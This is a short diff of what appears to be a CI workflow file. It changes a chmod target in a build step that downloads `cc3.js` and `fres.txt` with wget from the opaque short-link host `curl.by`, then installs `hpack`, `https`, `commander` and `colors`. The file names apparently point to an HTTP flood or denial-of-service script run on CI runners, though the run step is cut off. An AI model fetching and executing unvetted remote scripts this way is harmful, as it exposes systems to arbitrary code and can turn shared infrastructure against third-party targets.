@@ -28,7 +28,7 @@ jobs:
       run: |
         wget https://curl.by/FW3xU/cc3.js
         wget https://curl.by/di8qo/fres.txt
-        chmod +x cc2.js
+        chmod +x cc3.js
         npm i hpack https commander colors 
     - name: run
       run: |
